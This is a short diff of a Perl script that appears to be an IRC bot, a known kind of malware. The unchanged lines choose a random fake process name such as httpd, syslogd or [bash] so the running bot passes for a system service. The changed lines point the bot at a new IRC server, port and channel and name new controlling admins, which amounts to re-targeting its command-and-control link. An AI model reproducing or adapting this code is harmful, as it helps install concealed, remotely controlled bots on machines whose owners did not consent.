@@ -24,10 +24,10 @@
 my @ps = ("/usr/local/apache/bin/httpd -DSSL","/sbin/syslogd","[eth0]","/sbin/klogd -c 1 -x -x","/usr/sbin/acpid","/usr/sbin/cron","[bash]");
 my $processo = $ps[rand scalar @ps];
 
-$servidor='67.225.132.46' unless $servidor;
-my $porta='7000';
-my @canais=("#bot");
-my @adms=("xSenha","mendes_rs");
+$servidor='irc.quakenet.org' unless $servidor;
+my $porta='6667';
+my @canais=("#2k19");
+my @adms=("Dontcry","DarkAcidBurn");
 
 # Anti Flood ( 6/3 Recomendado )
 my $linas_max=10;
